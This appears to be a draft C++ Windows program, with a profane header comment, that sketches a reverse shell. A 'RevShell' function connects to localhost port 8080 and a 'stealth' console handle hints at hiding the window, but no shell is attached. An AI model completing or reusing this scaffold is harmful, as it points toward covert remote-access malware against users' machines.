/******************************************************************************* 
** Shit shit shit shit fuck you fuck you fuck you fuck you shit shit shit shit
*******************************************************************************/

#include <iostream>
#include <string>
#include <stdio.h>          

#include <winsock2.h>      //Socket Header
#include <windows.h>       //Win API Header
#include <ws2tcpip.h>      //TCP-IP Header
 
#pragma comment(lib, "Ws2_32")
#define DEFAULT_BUFLEN 1024

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
        std::cin.get();
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main()
{
    // Declare a window handle
    HWND stealth;           
    // Allocate a new console
    AllocConsole();     

    //Find the prev handler and hide/show the window depending upon the next command
    stealth=FindWindowA("ConsoleWindowClass",NULL); 
   
    //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console 
    ShowWindow(stealth,SW_SHOWNORMAL);  
    RevShell();
    return 0;
}
